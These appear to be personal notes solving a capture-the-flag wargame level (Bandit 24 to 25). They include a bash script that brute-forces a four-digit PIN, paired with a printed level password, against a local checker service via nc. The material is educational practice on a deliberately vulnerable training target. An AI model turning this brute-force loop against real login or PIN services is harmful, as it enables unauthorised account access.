# 24 -> 25

- doing research on bash for-loops

```bash
#!/bin/bash

nc localhost 30002

for i in range {0000..9999}
do
echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
done
```

- problem cannot create files

## Research


- I should only start the connection at the end of my loop [1][StackExc]

```bash
#!/bin/bash
passwd24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
for i in {0000..9999}; do
            echo "$passwd24 $i"
done | nc localhost 30002  | grep -v Wrong | grep -v "I am the pincode checker for user bandit25"
```
- create a file in /tmp/[DIR]
    - strange because I tried this ...
    - somehow works on 2nd try
- forgot chmod 700
